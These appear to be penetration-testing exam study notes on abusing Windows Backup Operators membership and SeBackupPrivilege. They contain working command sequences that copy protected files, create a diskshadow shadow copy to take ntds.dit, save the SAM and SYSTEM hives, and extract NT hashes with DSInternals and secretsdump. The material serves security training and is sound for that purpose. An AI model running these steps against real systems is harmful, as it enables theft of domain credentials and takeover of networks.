This section is extremely important for **Windows privilege escalation and Active Directory enumeration**.

The core idea:

> **Group membership can grant powerful privileges even when the user is not a member of `Administrators` or `Domain Admins`.**

Windows and Active Directory contain several built-in groups with special permissions. During an assessment, you should always enumerate group membership and understand what each group allows.

![Image](https://images.openai.com/static-rsc-4/zA5dYvdgA7nxfAU14ZPGGN0S2kqrxOIPBErsCREHmudyxa6xtor5nEupOqU1qmUxrBSHeSWB_KLdLSiqBMtlDPrdOUSmmwJK8W6ItEkAUuUwiF_4pPAq1z1SPg5vqL2y8YUKSNJ-UnIel7I0JbqYsWFOHKD9wpAILaMPB5Y4i1dWsULl5IwwQ92XgdAOJtQ4?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/T5IsCy0APypJ-CM5NGGeL69Na0wBlskxJj-RNt9pkmoTd16LFqaaRik7Gx3tg75KxUId-TFK9BiulhKiJOFYjQOIkzSHhETRVnMH-2FOxR5sAQ_Bn7j-nUao_wmIqOepPiK5NVkb30o8N6eBCc-Ahl9DUsEc1WSbCfNGCjVTld5dXNgT8bhULMHUg44YQSDw?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/AU9hqEYV_DJwjfOLy_tUvhVjzQb36G0IFjr8ZzETyEST4ZEDA8TB8P7TLg6bv5jG6F1en67Torw6POb1rdxRTujit8Wd67maXo7NVpCNtSs_9GUopGb4bQGJ0ebLtYp4xbFjlGPmdwRTatQt-oNBYYC6r5gJge2A4Wuh9x5fzGDgVeZCFzJDj3DKBWvX2scU?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/jMlbJ8k4APPk0V-E-KTix6ntsjZ2L2OU2SsxvEv9HxVrOiId-y39efDEepqM6rDFdj62nIbc2Iw65JL60P-NCn2afVYziKfx07VcNP2JIC8JDv1wThT4nI1jzJyIX_hqZkRpgrwNC8_QGIX524a8liN2RcOrSrj-auX3VTPEtN2xQDmRdX4YDznn2dEJbQk6?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/kTqmsOlK9ZVuXlWYfBHOCKCJDJ1qslO6xHeVFRh-n_n_WSRj_yI9u2qFm-R4MXWYGmrOGrft2OuR62CKj9MXLudWi8hq4TixmhcSqStMPfCYqViOaSs7v-OhgbjFTRzvwDP4Nv39yTjjCCXcS667dF3GHlZ9exR5qOepqzsUYT6xFdIRrMYddiLqzwqAmliT?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/48NyVrDY2ik_SzGpSCkm5zgfo2JEhSDm95Hb4jac8oIxZOnj2JmeSbsNPaiqUfU17X92gg6EYJevgC3cHIVEgjQKjzfub1gRznVLh_gdgapHHyAlJLYI5yeIMURKsxBeurFoWz8SZogICyOhNP-0dQxAPgH0KlzfFzt9OQQUQqVt9ITf_I_suq-BXUyoI9Xv?purpose=fullsize)

---

# 1. Important Built-in Groups

The module focuses on:

|Group|Important capability|
|---|---|
|**Backup Operators**|`SeBackupPrivilege`, `SeRestorePrivilege`|
|**Event Log Readers**|Read event logs|
|**DnsAdmins**|DNS administration; potentially powerful in AD|
|**Hyper-V Administrators**|Hyper-V administration|
|**Print Operators**|Printer management / associated privileges|
|**Server Operators**|Server-management privileges|

The source emphasizes that unnecessary or leftover membership in these groups should be identified during an assessment.

### Why this matters

Organizations sometimes add accounts to these groups instead of giving them full administrative membership.

That can be legitimate:

```text
Backup employee
      ↓
Backup Operators
```

or:

```text
Service account
      ↓
Special-purpose group
```

But it can also happen accidentally or remain after testing/vendor deployments.

---

# 2. First Command: `whoami /groups`

After obtaining a Windows shell:

```cmd
whoami /groups
```

This tells you which security groups your current account belongs to.

For CPTS, don't just look for:

```text
Administrators
Domain Admins
```

Also look for special groups such as:

```text
Backup Operators
DnsAdmins
Print Operators
Server Operators
Hyper-V Administrators
Event Log Readers
```

---

# 🔥 3. Backup Operators

This is the most important group in this section.

Membership in:

```text
Backup Operators
```

grants:

```text
SeBackupPrivilege
SeRestorePrivilege
```

The important one for this attack path is:

```text
SeBackupPrivilege
```

---

# 4. What Does `SeBackupPrivilege` Do?

`SeBackupPrivilege` allows a user to access/copy files for backup purposes even when the normal ACL doesn't grant the user access.

The source explains that it allows traversing directories and copying files despite the absence of an appropriate ACE, provided the file is accessed using the appropriate backup semantics.

Think:

```text
Normal access:

User
 ↓
ACL
 ↓
DENIED ❌


Backup privilege:

User
 ↓
SeBackupPrivilege
 ↓
Backup semantics
 ↓
Protected file
 ↓
COPY ✅
```

---

# 5. Check the Privilege

Run:

```powershell
whoami /priv
```

The example shows:

```text
SeBackupPrivilege      Disabled
SeRestorePrivilege     Disabled
SeShutdownPrivilege    Disabled
SeChangeNotifyPrivilege Enabled
```

You can also use:

```powershell
Get-SeBackupPrivilege
```

which reports:

```text
SeBackupPrivilege is disabled
```

---

# 6. Enable `SeBackupPrivilege`

The supplied PowerShell cmdlets can enable it:

```powershell
Set-SeBackupPrivilege
```

Then verify:

```powershell
Get-SeBackupPrivilege
```

Expected:

```text
SeBackupPrivilege is enabled
```

You can also verify again:

```powershell
whoami /priv
```

and see:

```text
SeBackupPrivilege    Enabled
```

### Important

Depending on the system configuration, the source notes that an **elevated CMD prompt** may be required to bypass UAC and use the privilege.

---

# 7. Protected File Example

Suppose you discover:

```text
C:\Confidential\2021 Contract.txt.txt
```

You can enumerate it:

```powershell
dir C:\Confidential\
```

but trying:

```powershell
cat 'C:\Confidential\2021 Contract.txt.txt'
```

results in:

```text
Access to the path ... is denied.
```

Normally you'd be stuck.

But with `SeBackupPrivilege`, you can use the backup-aware copy functionality.

---

# 8. `Copy-FileSeBackupPrivilege`

The HTB example uses:

```powershell
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt.txt' .\Contract.txt
```

The file is successfully copied despite the normal access restriction.

Then:

```powershell
cat .\Contract.txt
```

can read the copied file.

### Important distinction

You aren't changing the original ACL.

Instead:

```text
Protected file
      ↓
SeBackupPrivilege
      ↓
Backup-aware copy
      ↓
Accessible copy
```

This is different from the previous `SeTakeOwnershipPrivilege` technique.

---

# 🧠 SeTakeOwnership vs SeBackup

This is **very important for CPTS**.

||`SeTakeOwnershipPrivilege`|`SeBackupPrivilege`|
|---|---|---|
|Main idea|Become object owner|Access/copy for backup|
|Modify ownership?|✅|Not the objective|
|Modify ACL?|Often needed|Not necessarily|
|Original file accessible?|After ACL modification|Can bypass normal read restrictions for backup|
|Typical command|`takeown`|`Copy-FileSeBackupPrivilege` / `robocopy /B`|

### Memory trick

```text
SeTakeOwnership
      ↓
"I'll become the owner."


SeBackupPrivilege
      ↓
"I'll access it as a backup operation."
```

---

# 🔥 9. Domain Controller — `NTDS.dit`

This is where `Backup Operators` becomes particularly interesting.

On a Domain Controller:

```text
C:\Windows\NTDS\ntds.dit
```

contains the Active Directory database.

The source describes `NTDS.dit` as containing NTLM hashes for domain user and computer objects.

### Attack concept

```text
Backup Operators
       │
       ▼
SeBackupPrivilege
       │
       ▼
Access protected files
       │
       ▼
NTDS.dit
       │
       ▼
Domain credential material
       │
       ▼
Further AD access
```

This is why **Backup Operators membership on a Domain Controller deserves serious attention** during a pentest.

---

# 10. Why Can't We Just Copy `NTDS.dit`?

Because `NTDS.dit` is normally being used by the system and is locked.

The source therefore demonstrates creating a **shadow copy** of the C: drive with `diskshadow`.

Conceptually:

```text
Live C:
└── Windows
    └── NTDS
        └── ntds.dit   ← locked

          ↓ diskshadow

Shadow Copy → E:

E:
└── Windows
    └── NTDS
        └── ntds.dit   ← accessible copy
```

---

# 11. `diskshadow`

The source's sequence is:

```text
diskshadow.exe
```

Then:

```text
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit
```

Afterwards:

```powershell
dir E:
```

shows the copied filesystem.

---

# 12. Copy `NTDS.dit`

Now the backup-aware copy command can target the shadow copy:

```powershell
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

The source demonstrates successfully copying the file.

Now you have:

```text
C:\Tools\ntds.dit
```

available for offline analysis.

---

# 13. SAM + SYSTEM Registry Hives

`SeBackupPrivilege` can also be used to back up registry hives containing local account credential material.

The source uses:

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
```

and:

```cmd
reg save HKLM\SAM SAM.SAV
```

Conceptually:

```text
SeBackupPrivilege
       │
       ├── NTDS.dit
       │
       ├── SAM
       │
       └── SYSTEM
```

These can then be processed offline.

---

# ⚠️ Important Exception — Explicit DENY

This is an important detail that could easily become a CPTS question.

The source explicitly states that if the target has an **explicit deny entry** for your user or a group you're part of, that deny can prevent access even when `FILE_FLAG_BACKUP_SEMANTICS` is used.

So don't memorize:

> "SeBackupPrivilege bypasses absolutely everything."

Instead:

> **SeBackupPrivilege provides special backup access, but explicit deny entries can still matter.**

---

# 14. Extracting Credentials from `NTDS.dit`

Once `ntds.dit` and the SYSTEM boot key material are available, the source demonstrates offline extraction using **DSInternals**.

Example:

```powershell
Import-Module .\DSInternals.psd1
```

Then:

```powershell
$key = Get-BootKey -SystemHivePath .\SYSTEM
```

And:

```powershell
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

The output contains account information and credential material, including an NT hash.

---

# 15. `secretsdump.py`

The source also demonstrates extracting hashes from the offline database using Impacket:

```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

The resulting output contains entries in the form:

```text
username:RID:LMhash:NThash
```

### Why is this valuable?

Recovered hashes can potentially be:

```text
Used for Pass-the-Hash
        OR
Cracked offline
        ↓
Recover passwords
        ↓
Further access
```

The source specifically notes both Pass-the-Hash and offline cracking as possible next steps.

---

# 16. Robocopy — No External Tool Required

A particularly useful part for CPTS is that you don't necessarily need the PowerShell PoC.

Windows has a built-in utility:

```text
robocopy
```

The source explains that Robocopy supports backup mode and is a Windows command-line directory replication utility.

The key switch is:

```text
/B
```

which performs copying in **Backup mode**.

Example from the source:

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

Result:

```text
ntds.dit
```

is copied successfully.

The module emphasizes that this eliminates the need for external tools.

---

# 🔥 Full Backup Operators Attack Chain

This is the part I would memorize for CPTS:

```text
              Windows Shell
                    │
                    ▼
             whoami /groups
                    │
                    ▼
            Backup Operators?
                    │
                    ▼
             whoami /priv
                    │
                    ▼
            SeBackupPrivilege
                    │
                    ▼
             Enable if needed
                    │
          ┌─────────┴──────────┐
          │                    │
          ▼                    ▼
     Normal Server        Domain Controller
          │                    │
          ▼                    ▼
 Protected files          NTDS.dit
          │                    │
          ▼                    ▼
 Backup-aware copy        Shadow Copy
          │                    │
          ▼                    ▼
 Sensitive data          Copy NTDS.dit
                               │
                               ▼
                       Offline extraction
                               │
                    ┌──────────┴─────────┐
                    ▼                    ▼
               secretsdump            DSInternals
                    │                    │
                    └─────────┬──────────┘
                              ▼
                       Credential hashes
```

---

# 🧠 Compare the Last Three Modules

You've now covered three very important Windows privilege-escalation techniques:

|Privilege|What you're abusing|Think|
|---|---|---|
|`SeImpersonatePrivilege`|Security tokens|**Potato attacks**|
|`SeDebugPrivilege`|Processes/process memory|**LSASS / SYSTEM process**|
|`SeTakeOwnershipPrivilege`|Object ownership|**takeown → ACL**|
|`SeBackupPrivilege`|Backup access|**Copy protected files**|

### Easy mental model

```text
SeImpersonate
      ↓
     TOKEN

SeDebug
      ↓
   PROCESS

SeTakeOwnership
      ↓
    OBJECT

SeBackup
      ↓
   FILE DATA
```

---

# 🎯 CPTS Enumeration Workflow

When you land on a Windows machine:

### 1️⃣ Identify yourself

```cmd
whoami
```

### 2️⃣ Enumerate groups

```cmd
whoami /groups
```

### 3️⃣ Enumerate privileges

```cmd
whoami /priv
```

### 4️⃣ Look for:

```text
Backup Operators
DnsAdmins
Print Operators
Server Operators
Hyper-V Administrators
Event Log Readers
```

and:

```text
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

### 5️⃣ If you see Backup Operators

Think:

```text
SeBackupPrivilege
      ↓
Protected files?
      ↓
SAM / SYSTEM?
      ↓
Domain Controller?
      ↓
NTDS.dit?
```

---

# 🏆 CPTS Must-Know

### What group grants `SeBackupPrivilege`?

**Backup Operators.**

### What does `SeBackupPrivilege` allow?

It provides special backup access that can allow protected files to be copied despite normal ACL restrictions.

### What command checks it?

```cmd
whoami /priv
```

or:

```powershell
Get-SeBackupPrivilege
```

### How can it be enabled in the example?

```powershell
Set-SeBackupPrivilege
```

### What tool can create a shadow copy?

```text
diskshadow.exe
```

### What highly valuable AD database can be targeted?

```text
NTDS.dit
```

### What local registry hives are interesting?

```text
SAM
SYSTEM
```

### What tool can extract hashes from an offline NTDS database?

```text
secretsdump.py
```

or:

```text
DSInternals
```

### What built-in Windows utility can copy in backup mode?

```text
robocopy
```

with:

```text
/B
```

### Most important command from the final section:

```cmd
robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

---

## 🧠 Final memory trick

> **Backup Operators → SeBackupPrivilege → bypass normal file-read restrictions for backup → protected files → NTDS.dit/SAM/SYSTEM → offline credential extraction.**

And remember the distinction from the previous module:

> **`SeTakeOwnershipPrivilege` changes who owns the object; `SeBackupPrivilege` is about accessing/copying protected data through backup semantics.**